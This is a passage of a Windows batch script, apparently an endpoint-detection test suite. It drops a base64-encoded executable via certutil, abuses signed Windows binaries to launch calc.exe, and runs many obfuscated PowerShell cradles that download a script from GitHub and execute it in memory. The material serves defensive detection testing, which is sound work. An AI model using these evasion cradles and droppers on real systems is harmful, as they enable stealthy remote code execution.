REM start line 648
REM end line 1009

echo %time% %date% [+] Testing WseClientSvc.exe exec
REM Source taken from https://blog.huntresslabs.com/abusing-trusted-applications-a719219220f?gi=de073115ebbc
echo -----BEGIN CERTIFICATE----- > pass.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> pass.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDADpYUFsAAAAA >> pass.b64
echo AAAAAOAAAgELAQsAAAQAAAAIAAAAAAAATiMAAAAgAAAAQAAAAABAAAAgAAAAAgAA >> pass.b64
echo BAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAA >> pass.b64
echo AAAAABAAAAAAAAAAAAAAAAAjAABLAAAAAEAAANAEAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA >> pass.b64
echo VAMAAAAgAAAABAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANAEAAAAQAAA >> pass.b64
echo AAYAAAAGAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADAAA >> pass.b64
echo AAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAwIwAAAAAAAEgAAAACAAUA >> pass.b64
echo ZCAAAJwCAAABAAAAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAC4AAhaaKAMAAAomKh4CKAQAAAoqQlNKQgEAAQAAAAAA >> pass.b64
echo DAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAAAEAACN+AABsAQAA0AAAACNTdHJpbmdz >> pass.b64
echo AAAAADwCAAAIAAAAI1VTAEQCAAAQAAAAI0dVSUQAAABUAgAASAAAACNCbG9iAAAA >> pass.b64
echo AAAAAAIAAAFHFQAACQAAAAD6JTMAFgAAAQAAAAQAAAACAAAAAgAAAAEAAAAEAAAA >> pass.b64
echo AgAAAAEAAAACAAAAAAAKAAEAAAAAAAYANAAtAAYAawBLAAYAiwBLAAoAwQCuAAAA >> pass.b64
echo AAABAAAAAAABAAEAAAAQABMAGwAFAAEAAQBQIAAAAACRADsACgABAFwgAAAAAIYY >> pass.b64
echo QAAQAAIAAAABAEYAEQBAABQAGQBAABAAIQDJABkACQBAABAALgALAB8ALgATACgA >> pass.b64
echo BIAAAAAAAAAAAAAAAAAAAAAAqQAAAAQAAAAAAAAAAAAAAAEAJAAAAAAABAAAAAAA >> pass.b64
echo AAAAAAAAAQAtAAAAAAAAAAA8TW9kdWxlPgBwYXNzLmV4ZQBQcm9ncmFtAHBhc3N0 >> pass.b64
echo aHJ1AG1zY29ybGliAFN5c3RlbQBPYmplY3QATWFpbgAuY3RvcgBhcmdzAFN5c3Rl >> pass.b64
echo bS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9u >> pass.b64
echo c0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwYXNzAFN5 >> pass.b64
echo c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFN0YXJ0AAAAAyAAAAAAADKi38C8gvFL >> pass.b64
echo n9EJCAHas0cACLd6XFYZNOCJBQABAR0OAyAAAQQgAQEIBQABEhEOCAEACAAAAAAA >> pass.b64
echo HgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAoIwAAAAAAAAAAAAA+IwAA >> pass.b64
echo ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCMAAAAAAAAAAF9Db3JFeGVNYWluAG1z >> pass.b64
echo Y29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAADgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
echo AQAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
echo AAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAJAAAACgQAAAPAIAAAAAAAAAAAAA >> pass.b64
echo 4EIAAOoBAAAAAAAAAAAAADwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4A >> pass.b64
echo RgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAABAAAA >> pass.b64
echo AAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA >> pass.b64
echo AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAScAQAAAQBTAHQAcgBpAG4A >> pass.b64
echo ZwBGAGkAbABlAEkAbgBmAG8AAAB4AQAAAQAwADAAMAAwADAANABiADAAAAAsAAIA >> pass.b64
echo AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYA >> pass.b64
echo aQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADQACQABAEkA >> pass.b64
echo bgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcABhAHMAcwAuAGUAeABlAAAAAAAoAAIA >> pass.b64
echo AQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAAPAAJAAEATwByAGkA >> pass.b64
echo ZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAHAAYQBzAHMALgBlAHgAZQAAAAAA >> pass.b64
echo NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4A >> pass.b64
echo MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4A >> pass.b64
echo MAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9 >> pass.b64
echo IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJu >> pass.b64
echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0i >> pass.b64
echo MS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFt >> pass.b64
echo ZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJu >> pass.b64
echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4N >> pass.b64
echo CiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1t >> pass.b64
echo aWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRp >> pass.b64
echo b25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAg >> pass.b64
echo ICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8 >> pass.b64
echo L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo ACAAAAwAAABQMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= >> pass.b64
echo -----END CERTIFICATE----- >> pass.b64
start "" cmd /c certutil -f -decode pass.b64 pass_TestBin.exe >nul
start "" cmd /c WseClientSvc.exe pass_TestBin.exe calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: certutil -f -decode pass.b64 pass_TestBin.exe 
echo Command Excuted: WseClientSvc.exe pass_TestBin.exe calc.exe 

timeout 5


REM ---- EOF LOLBAS Payloads ----

echo **********************************************
echo *        Testing Custom PAYLOADS             *
echo **********************************************


echo %time% %date% [+] Testing winnt32 exec
start "" cmd /c winnt32 /cmd:calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: winnt32 /cmd:calc.exe

timeout 5

echo %time% %date% [+] Testing winrs exec
start "" cmd /c winrs -r:http://127.0.0.1 calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: winrs -r:http://127.0.0.1 calc.exe

timeout 5

REM Example: https://twitter.com/subtee/status/872244674609676288
echo %time% %date% [+] Testing waitfor exec
start "" cmd /c waitfor SDX & calc.exe
timeout 3
start "" cmd /c waitfor /s 127.0.0.1 /si SDX
echo Execution Finished at %time% %date%
echo Command Excuted: waitfor SDX & calc.exe
echo Command Excuted: waitfor /s 127.0.0.1 /si SDX

echo %time% %date% [+] Testing .SettingContent-ms extension exec
echo ^<?xml version="1.0" encoding="UTF-8"?^> > Test.SettingContent-ms
echo  ^<PCSettings^> >> Test.SettingContent-ms
echo    ^<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"^> >> Test.SettingContent-ms
echo      ^<ApplicationInformation^> >> Test.SettingContent-ms
echo        ^<AppID^> windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel^</AppID^> >> Test.SettingContent-ms
echo        ^<DeepLink^> %windir%\system32\calc.exe^</DeepLink^> >> Test.SettingContent-ms
echo        ^<Icon^> %windir%\system32\control.exe^</Icon^> >> Test.SettingContent-ms
echo      ^</ApplicationInformation^> >> Test.SettingContent-ms
echo      ^<SettingIdentity^> >> Test.SettingContent-ms
echo      ^<PageID^> ^</PageID^> >> Test.SettingContent-ms
echo        ^<HostID^> {12B1697E-D3A0-4DBC-B568-CCF64A3F934D}^</HostID^> >> Test.SettingContent-ms
echo      ^</SettingIdentity^> >> Test.SettingContent-ms
echo      ^<SettingInformation^> >> Test.SettingContent-ms
echo        ^<Description^> @shell32.dll,-4161^</Description^> >> Test.SettingContent-ms
echo        ^<Keywords^> @shell32.dll,-4161^</Keywords^> >> Test.SettingContent-ms
echo      ^</SettingInformation^> >> Test.SettingContent-ms
echo    ^</SearchableContent^> >> Test.SettingContent-ms
echo  ^</PCSettings^> >> Test.SettingContent-ms
start "" cmd /c Test.SettingContent-ms
echo Execution Finished at %time% %date%
echo Command Excuted: Test.SettingContent-ms

timeout 5


REM ---- EOF Custom Payloads ----

echo **********************************************
echo *    Testing Invoke-CradleCrafter PAYLOADS   *
echo **********************************************

REM Payloads in this section were generated using https://github.com/danielbohannon/Invoke-CradleCrafter.

echo %time% %date% [+] Testing MEMORY\PSWEBSTRING exec
start "" cmd /c powershell -c "Set-Item Variable:\FW 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';dir ect*;SI Variable:/d (.(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).PsObject.Methods|Where{(ChildItem Variable:/_).Value.Name-ilike'*Co*d'}).Name).Invoke((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'*man*Name'}).Name).Invoke('*w-*ct',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)Net.WebClient);(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'I*t'}).Name).Invoke((Variable d -Va).((((Variable d -Va)|Get-Member)|Where{(ChildItem Variable:/_).Value.Name-ilike'*wn*g'}).Name).Invoke((Get-Item Variable:/FW).Value))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBDATA exec
start "" cmd /c powershell -c "dir ect*;SV j8 (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Member|?{$_.Name-like'*nd*e'}).Name).Invoke('Ne*ct',$TRUE,$TRUE))Net.WebClient);Set-Variable z 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';[ScriptBlock]::Create(([String]::Join('',(((Get-Variable j8 -ValueOn).((((Get-Variable j8 -ValueOn)|Member)|?{$_.Name-like'D*a'}).Name).Invoke((Variable z -ValueOnl))|%{$_-As'Char'}))))).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBOPENREAD exec
start "" cmd /c powershell -c "$wr=(New-Object Net.WebClient);$url='https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$sr=New-Object IO.StreamReader($wr.OpenRead($url));$res=$sr.ReadToEnd();$sr.Close();$res" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBSTRING exec
start "" cmd /c powershell -c "([System.Net.WebClient]::New().DownloadString('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt'))" 
echo Execution Finished at %time% %date%

timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBDATA exec
start "" cmd /c powershell -c "Set-Variable Q 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';SI Variable:/V0r ([Net.WebClient]::New());SV MAI (((((GV V0r).Value|Member)|?{(ChildItem Variable:/_).Value.Name-like'*wn*a'}).Name));&([ScriptBlock]::Create(([System.String]::Join('',(((GV V0r).Value.((GI Variable:\MAI).Value)((GV Q).Value)|ForEach{(GI Variable:\_).Value-As'Char'}))))))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBOPENREAD exec
start "" cmd /c powershell -c "Set-Variable RsL ([Net.WebClient]::New());SV 7SW 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable RsL (LS Variable:RsL).Value.((((LS Variable:RsL).Value|Member)|Where-Object{(Variable _).Value.Name-ilike'*ad'}).Name)((Variable 7SW -Va));Set-Variable UR '';Try{While((Get-Item Variable:UR).Value+=[Char](LS Variable:RsL).Value.ReadByte()){}}Catch{};[ScriptBlock]::Create((Get-Item Variable:UR).Value).InvokeReturnAsIs()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBREQUEST exec
start "" cmd /c powershell -c "Set-Item Variable:/c 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';[ScriptBlock]::Create((((Get-Item Variable:c).Value|ForEach-Object{(.(Get-Variable E*tex*).Value.InvokeCommand.(((Get-Variable E*tex*).Value.InvokeCommand|Get-Member|Where{$_.Name-clike'*t*a*d'}).Name)((Get-Variable E*tex*).Value.InvokeCommand.(((Get-Variable E*tex*).Value.InvokeCommand.PsObject.Methods|Where{$_.Name-clike'*nd*e'}).Name)('In*k*t',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet) $_)})|ForEach-Object{$_.(($_|Get-Member)[4].Name).Invoke()})).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSRESTMETHOD exec
start "" cmd /c powershell -c "SI Variable:50a 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable Z ((Get-ChildItem Variable:50a).Value|ForEach-Object{(.$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where-Object{(Variable _ -Va).Name-like'*man*Name'}).Name)('*-Re*d',1,1),[Management.Automation.CommandTypes]::Cmdlet) (Variable _ -Va))});IEX (GV Z -ValueO)" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBREQUEST exec
start "" cmd /c powershell -c "SI Variable:\UB ([Net.HttpWebRequest]::Create('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt').GetResponse().GetResponseStream());Set-Variable AZe '';Try{While((Variable AZe).Value+=[Char](Variable UB).Value.ReadByte()){}}Catch{};[ScriptBlock]::Create((Variable AZe).Value).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSSENDKEYS execs
start "" cmd /c powershell -c "ls _-*;Set-Item Variable:/O (&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('N*-O*',1,1))-ComObj WScript.Shell);Set-Item Variable:/l 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable fN 'HKCU:\Software\Microsoft\Notepad';SI Variable:\76 'Notepad';$Null=[System.Reflection.Assembly]::([System.Reflection.Assembly].GetMethods()|Where-Object{$_.Name-like'L*ame'}|ForEach{(LS Variable:\_).Value.Name}|Select  -Firs 1).Invoke('System.Windows.Forms');Set-Variable 5M (&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')(Item Variable:\fN).Value);@(@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[14].Name),0),@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[8].Name),([String]([Windows.Forms.Screen]::AllScreens)).Split('=')[5].Split('}')[0]))|ForEach{&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('S*-Ite*y')(Item Variable:\fN).Value $_[0] (LS Variable:\_).Value[1]};SV yda (Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[2].Name).Invoke((Item Variable:76).Value).ProcessID;SI Variable:\J $Null;While(!((Get-Variable J).Value)){SI Variable:\J (Process|Where-Object{$_.id-ceq(ChildItem Variable:yda).Value}|ForEach{(LS Variable:\_).Value.MainWindowTitle});&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500};While(!(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[0].Name).Invoke((Get-Variable J).Value)){&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500};(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke('^o');&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500;@((Get-Variable l -ValueOnl),(' '*1000),'~')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke((LS Variable:\_).Value)};SI Variable:q $Null;While((Item Variable:\q).Value.Length -lt 2){[System.Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke($_)};&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500;SI Variable:q ([System.Windows.Forms.Clipboard]::([System.Windows.Forms.Clipboard].GetMethods()[16].Name).Invoke())};[System.Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke((LS Variable:\_).Value)};If(Process|Where-Object{$_.id-ceq(ChildItem Variable:yda).Value}){@('{TAB}','~')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke($_)}};@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[7].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[14].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[6].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[8].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[5].Name))|ForEach{&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('S*-Ite*y')(Item Variable:\fN).Value $_ (GCI Variable:5M).Value.((LS Variable:\_).Value)};(Item Variable:\q).Value|&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*e-*press*',1,1))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMWORD exec
start "" cmd /c powershell -c "gdr -*;Set-Item Variable:8 (&$ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member)[2].Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*w-*ct',$TRUE,$TRUE))-C Word.Application);While((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'*sy'}).Name)){&($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*d'}).Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*t-Sl*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet))-Mil 1000}(Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member)[420].Name)=(Get-Variable Fal* -Value);SV xz (Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'D*cu*ts'}).Name).(((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'D*cu*ts'}).Name).PsObject.Members|?{$_.Name-like'O*n'}).Name).Invoke('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt');While((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'*sy'}).Name)){&($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*d'}).Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*t-Sl*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet))-Mil 1000}(ChildItem Variable:/xz).Value.(((ChildItem Variable:/xz).Value|Member)[205].Name).(((ChildItem Variable:/xz).Value.(((ChildItem Variable:/xz).Value|Member)[205].Name)|Member)[172].Name)|.(COMMAND *-Ex*n);(Get-Variable 8 -ValueOn).Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject((Get-Variable 8 -ValueOn))" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMEXCEL exec
start "" cmd /c powershell -c "$comExcel=New-Object -ComObject Excel.Application;While($comExcel.Busy){Start-Sleep -Seconds 1}$comExcel.DisplayAlerts=$False;$Null=$comExcel.Workbooks.Open('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt');While($comExcel.Busy){Start-Sleep -Seconds 1}(($comExcel.Sheets.Item(1).Range(\"A1:Q\"+$comExcel.Sheets.Item(1).UsedRange.Rows.Count).Value2|?{(LS Variable:_).Value})-Join\"`n\");$comExcel.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($comExcel)" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMIE exec
